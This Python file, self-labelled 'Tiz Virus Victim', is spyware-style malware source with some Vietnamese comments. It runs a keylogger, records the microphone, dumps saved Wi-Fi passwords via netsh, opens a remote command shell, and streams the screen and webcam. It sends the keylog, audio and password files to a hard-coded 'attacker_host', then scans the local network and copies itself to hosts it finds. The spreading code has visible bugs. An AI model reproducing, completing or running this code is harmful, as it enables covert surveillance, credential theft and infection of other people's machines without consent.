# -*- coding: utf-8 -*-
"""
Created on Dec 23 2020

@autor Tiz
"""

import threading
import subprocess
import socket
import argparse
import sys
import os
import time
import logging
from pynput.keyboard import Listener
import wave
import pyaudio
import zlib
import mss
import cv2
from PIL import Image
import queue
from http.client import HTTPConnection
import json


def parseargs():
    cli_args = argparse.ArgumentParser(description="Tiz Virus Victim")
    cli_args.add_argument('--host', help="listening ip, default is '0.0.0.0', no need to change", default='0.0.0.0',
                          type=str)
    cli_args.add_argument('--port',
                          help="default port is 5000, revershell = port, camera stream = port+1, screen stream = port+2",
                          default=5000, type=int)
    cli_args.add_argument('--keylog', help="keylog=t create a keylogger file / keylog=f don't create the file",
                          default="t", type=str)
    cli_args.add_argument('--micro',
                          help="micro=10 record the microphone during 10 sec and put it in a file / micro=0 don't record",
                          default=10, type=int)
    cli_args.add_argument('--wifi', help="wifi=t create a file with all wifis password / wifi=f don't create the file",
                          default="t", type=str)
    cli_args.add_argument('--shell', help="shell=t revershell on port (default = 5000) / shell=f don't revershell",
                          default="t", type=str)
    cli_args.add_argument('--camera', help="camera=t stream camera on port+1 (default = 5001) / camera=f don't stream",
                          default="t", type=str)
    cli_args.add_argument('--screen', help="screen=t stream screen on port+2 (default = 5002) / screen=f don't stream",
                          default="t", type=str)
    options = cli_args.parse_args(sys.argv[1:])
    return options


def key_handler(key):
    logging.info(key)


def keylog():
    with Listener(on_press=key_handler) as listener:
        listener.join()


def Microphone(Seconds=10, File="record.wav"):
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 2
    RATE = 44100
    RECORD_SECONDS = float(Seconds)
    WAVE_OUTPUT_FILENAME = File
    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
    frames = []
    for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
        data = stream.read(CHUNK)
        frames.append(data)
    stream.stop_stream()
    stream.close()
    p.terminate()
    wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
    wf.setnchannels(CHANNELS)
    wf.setsampwidth(p.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b''.join(frames))
    wf.close()


def wifipass():
    with open("wifis.txt", "w", encoding="utf-8") as fichier:
        try:
            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], encoding="cp437").split('\n')
            wifis = [line.split(':')[1].strip() for line in data if "All User Profile" in line]
            for wifi in wifis:
                try:
                    keys = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', wifi, 'key=clear'],
                                                   encoding="cp437").split('\n')
                    key = [line.split(':')[1].strip() for line in keys if "Key Content" in line]
                    fichier.write(f"{wifi}: {key[0] if key else 'No password found'}\n")
                except subprocess.CalledProcessError as e:
                    print(f"Error retrieving password for {wifi}: {e}")
                except IndexError:
                    print(f"Password not found for {wifi}")
        except Exception as e:
            print(f"Failed to retrieve Wi-Fi profiles: {e}")


def retreive_screenshot(conn):
    with mss.mss() as sct:
        monitor = sct.monitors[1]  # Chọn toàn bộ màn hình
        WIDTH, HEIGHT = 600, 300  # Kích thước gửi đi

        while True:
            try:
                # Chụp màn hình với độ phân giải gốc
                screenshot = sct.grab(monitor)

                # Chuyển ảnh sang định dạng Pillow để resize
                img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
                img_resized = img.resize((WIDTH, HEIGHT))  # Resize về 600x300

                # Chuyển ảnh đã resize thành bytes và nén
                pixels = zlib.compress(img_resized.tobytes())
                size = len(pixels)

                # Gửi kích thước cố định 4 bytes
                conn.send((4).to_bytes(1, byteorder='big'))  # Always send 4 as size length
                conn.send(size.to_bytes(4, byteorder='big'))  # Fixed 4 bytes for size

                # Gửi toàn bộ dữ liệu ảnh
                conn.sendall(pixels)

            except Exception as e:
                print(f"Error sending screen: {e}")
                break


def screen_sender(host='0.0.0.0', port=5001):
    with socket.socket() as sock:
        sock.bind((host, port))
        sock.listen(5)
        print('screen sender started.')
        while True:
            conn, _ = sock.accept()
            threadscreen2 = threading.Thread(target=retreive_screenshot, args=(conn,))
            threadscreen2.start()


def handle_client(client_socket):
    BUFFER_SIZE = 4096
    while True:
        try:
            command = client_socket.recv(BUFFER_SIZE).decode('utf-8')
            if command.lower() == "exit":
                print("Disconnected from client.")
                break
            output = subprocess.getoutput(command)
            if not output:
                output = "Command executed but no output."
            client_socket.send(output.encode('utf-8'))
        except Exception as e:
            print(f"Error: {e}")
            break
    client_socket.close()


def R_tcp(host='0.0.0.0', port=5000):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(5)
    print(f"Reverse shell started and listening on {host}:{port}.")
    while True:
        client_socket, client_address = s.accept()
        print(f"{client_address[0]}:{client_address[1]} Connected!")
        threading.Thread(target=handle_client, args=(client_socket,)).start()


def capturevid(conn):
    try:
        cap = cv2.VideoCapture(0)
        WIDTH, HEIGHT = 600, 300  # Resize kích thước hình ảnh giống như screensender
        while cap.isOpened():
            try:
                ret, frame = cap.read()
                if not ret:
                    print("Failed to capture frame.")
                    break

                # Resize frame
                frame_resized = cv2.resize(frame, (WIDTH, HEIGHT))

                # Nén ảnh
                compress_img = cv2.imencode('.jpg', frame_resized)[1]
                pixels = zlib.compress(compress_img.tobytes())
                size = len(pixels)

                # Gửi kích thước cố định 4 bytes
                conn.send((4).to_bytes(1, byteorder='big'))  # Always send 4 as size length
                conn.send(size.to_bytes(4, byteorder='big'))  # Fixed 4 bytes for size

                # Gửi toàn bộ dữ liệu ảnh
                conn.sendall(pixels)

            except ConnectionError:
                print("Connection lost")
                break
            except Exception as e:
                print(f"Error sending frame segment: {e}")
                break

    except Exception as e:
        print(f"Camera error: {e}")
    finally:
        if 'cap' in locals():
            cap.release()
        cv2.destroyAllWindows()
        try:
            conn.close()
        except Exception as e:
            print(f"Error closing connection: {e}")


def camsender(port=5002):
    host = "0.0.0.0"
    with socket.socket() as sock:
        sock.bind((host, port))
        sock.listen(5)
        print('camera sender started.')
        while True:
            conn, _ = sock.accept()
            thread = threading.Thread(target=capturevid, args=(conn,))
            thread.start()


def send_file(conn, file_path):
    try:
        filename = os.path.basename(file_path)
        filesize = os.path.getsize(file_path)
        file_info = f"{filename}|{filesize}".encode('utf-8')
        conn.sendall(file_info.ljust(1024))
        with open(file_path, 'rb') as f:
            while True:
                bytes_read = f.read(4096)
                if not bytes_read:
                    break
                conn.sendall(bytes_read)
        print(f"[VICTIM]: File {filename} sent successfully!")
    except Exception as e:
        print(f"Error sending file: {e}")


class NetworkScanner:
    def __init__(self, middleman_host, middleman_port):
        self.vulnerable_hosts = queue.Queue()
        self.target_ports = [5000, 5001, 5002]
        self.middleman_host = middleman_host
        self.middleman_port = middleman_port

    def notify_middleman(self, new_host):
        try:
            conn = HTTPConnection(self.middleman_host, self.middleman_port)
            headers = {'Content-type': 'application/json'}
            data = json.dumps({'new_host': new_host})
            conn.request('POST', '/new_host', data, headers)
            conn.close()
        except Exception as e:
            print(f"Failed to notify middleman: {e}")

    def scan_port(self, host, port):
        """Scan a single port on a host."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except:
            return False

    def scan_host(self, host):
        """Scan a single host for open ports."""
        try:
            for port in self.target_ports:
                if self.scan_port(host, port):
                    print(f"Found vulnerable host: {host} with port {port} open")
                    self.vulnerable_hosts.put((host, port))
                    self.notify_middleman(host)
                    break
        except Exception as e:
            print(f"Error scanning {host}: {e}")

    def get_local_ip_range(self):
        """Get the local network range."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            
            # Get base IP (assuming /24 subnet)
            ip_parts = local_ip.split('.')
            return '.'.join(ip_parts[:3])
        except:
            return "192.168.1"  # Fallback

    def scan_network(self):
        """Scan the entire network for vulnerable hosts."""
        base_ip = self.get_local_ip_range()
        scan_threads = []
        
        for i in range(1, 255):
            host = f"{base_ip}.{i}"
            thread = threading.Thread(target=self.scan_host, args=(host,))
            thread.daemon = True
            scan_threads.append(thread)
            thread.start()
            
            # Limit concurrent threads
            if len(scan_threads) >= 10:
                for t in scan_threads:
                    t.join()
                scan_threads = []
        
        # Wait for remaining threads
        for t in scan_threads:
            t.join()

    def get_vulnerable_hosts(self):
        """Return list of vulnerable hosts found."""
        hosts = []
        while not self.vulnerable_hosts.empty():
            hosts.append(self.vulnerable_hosts.get())
        return hosts

def spread_payload(target_host, target_port):
    """Attempt to spread the payload to a vulnerable host."""
    try:
        # Create a connection to the target
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(3)
            s.connect((target_host, target_port))
            
            # Get our own file content
            with open(__file__, 'rb') as f:
                payload = f.read()
            
            # Send payload size first
            size = len(payload)
            s.send(size.to_bytes(4, byteorder='big'))
            
            # Send the payload
            s.sendall(payload)
            
            print(f"Successfully spread to {target_host}:{target_port}")
            
    except Exception as e:
        print(f"Failed to spread to {target_host}:{target_port}: {e}")

def start_spreading():
    """Start scanning and spreading to vulnerable hosts."""
    scanner = NetworkScanner()
    
    while True:
        try:
            # Scan network for vulnerable hosts
            scanner.scan_network()
            
            # Get list of vulnerable hosts
            vulnerable_hosts = scanner.get_vulnerable_hosts()
            
            # Try to spread to each vulnerable host
            for host, port in vulnerable_hosts:
                threading.Thread(
                    target=spread_payload,
                    args=(host, port),
                    daemon=True
                ).start()
            
            # Wait before next scan
            time.sleep(300)  # 5 minutes between scans
            
        except Exception as e:
            print(f"Error in spreading routine: {e}")
            time.sleep(60)  # Wait 1 minute on error


if __name__ == "__main__":
    options = parseargs()
    if options.keylog == "t":
        logging.basicConfig(filename="Keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")
        threadlog = threading.Thread(target=keylog)
        threadlog.start()
    if options.micro > 0:
        threadmic = threading.Thread(target=Microphone, args=(options.micro,))
        threadmic.start()
    if options.wifi == "t":
        wifipass()
    if options.shell == "t":
        threadshell = threading.Thread(target=R_tcp, args=(options.host, options.port))
        threadshell.start()
    if options.screen == "t":
        WIDTH = 600
        HEIGHT = 300
        threadscreen = threading.Thread(target=screen_sender, args=(options.host, options.port + 1))
        threadscreen.start()
    if options.camera == "t":
        MAX_DGRAM = 2 ** 16
        MAX_IMAGE_DGRAM = MAX_DGRAM - 64
        threadcam = threading.Thread(target=camsender, args=(options.port + 2,))
        threadcam.start()
    attacker_host = '192.168.1.13'
    file_transfer_port = options.port + 3
    files_to_send = ["Keylog.txt", "record.wav", "wifis.txt"]
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((attacker_host, file_transfer_port))
                for file in files_to_send:
                    send_file(s, file)
                print("Successfully connected and sent files.")
                break
        except Exception as e:
            print(f"Error connecting to attacker for file transfer: {e}")
            print("Retrying in 5 seconds...")
            time.sleep(5)
    # Start spreading thread
    spreading_thread = threading.Thread(target=start_spreading, daemon=True)
    spreading_thread.start()